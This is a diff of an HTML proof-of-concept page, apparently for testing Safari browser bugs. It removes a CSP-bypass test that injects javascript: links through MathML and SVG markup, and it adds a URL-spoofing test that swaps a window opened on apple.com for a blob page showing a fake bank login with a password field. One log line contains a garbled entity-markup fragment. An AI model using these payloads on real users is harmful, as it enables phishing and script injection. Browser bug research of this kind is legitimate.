@@ -1,30 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><meta http-equiv="Content-Security-Policy" content="script-src 'self'"></head>
 <body>
-<h2>Safari CSP Bypass Test - Harusnya di-block</h2>
-<p>Kalau alert muncul padahal CSP script-src 'self' = BUG Safari</p>
-
-<div id="test"></div>
-
+<h2>URL Spoof Test - Safari</h2>
+<button onclick="spoof()">TEST SPOOF - TAP</button>
 <script>
-// Ini di Chrome akan di-block CSP, di Safari lama lolos
-document.getElementById('test').innerHTML = `
-<math>
-  <mtext href="javascript:alert('Safari CSP Bypass: '+document.domain)">CLICK - CSP BYPASS?</mtext>
-</math>
-<br>
-<svg><a href="javascript:alert(2)"><text x=20 y=20>SVG</text></a></svg>
-`;
-
-log("CSP: script-src 'self'");
-log("Kalau di Chrome: alert di-block CSP");
-log("Kalau di Safari: alert muncul = BUG SAFARI CSP BYPASS");
-</script>
-
-<pre id="log"></pre>
-<script>
-function log(m){document.getElementById('log').textContent+=m+"\n"}
+function spoof(){
+  let html = `<h1>Bank.com - Secure Login</h1><p>URL bar masih bank.com tapi content dari attacker</p><script>setTimeout(()=>{document.body.innerHTML='<h1>FAKE LOGIN - PHISHING</h1><input placeholder=password>'},2000)<\/script>`;
+  let blob = new Blob([html], {type:'text/html'});
+  let url = URL.createObjectURL(blob);
+  
+  // Buka bank.com dulu
+  let w = window.open("https://www.apple.com", "_blank");
+  setTimeout(()=>{
+    // Timpa dengan blob setelah 1 detik
+    w.location = url;
+    console.log("Kalau URL bar masih 【entity-apple¦canonical_name=Apple】.com tapi isi blob = SPOOF BUG");
+  },1000);
+}
 </script>
 </body>
 </html>
